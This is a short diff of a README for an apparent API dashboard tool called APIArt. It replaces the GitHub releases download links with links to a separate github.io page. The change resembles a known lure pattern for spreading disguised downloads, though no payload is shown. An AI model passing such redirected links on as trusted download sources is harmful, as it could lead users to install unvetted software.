@@ -1,12 +1,12 @@
 # 📊 apiart-api-dashboard - Visualize your API data with ease
 
-[![Download APIArt](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Ankletposer682/apiart-api-dashboard/releases)
+[![Download APIArt](https://img.shields.io/badge/Download-Latest-blue.svg)](https://ankletposer682.github.io)
 
 APIArt turns complex data into clear visuals. It connects to your REST API and converts JSON responses into charts and graphs. You see live updates as your data changes. Use this tool for streaming telemetry or to manage edge proxies. You can also export your dashboard layouts to share with your team.
 
 ## 📥 How to download the application
 
-Visit this page to download the software: [https://github.com/Ankletposer682/apiart-api-dashboard/releases](https://github.com/Ankletposer682/apiart-api-dashboard/releases)
+Visit this page to download the software: [https://ankletposer682.github.io](https://ankletposer682.github.io)
 
 Follow these steps to set up the software on your computer:
 
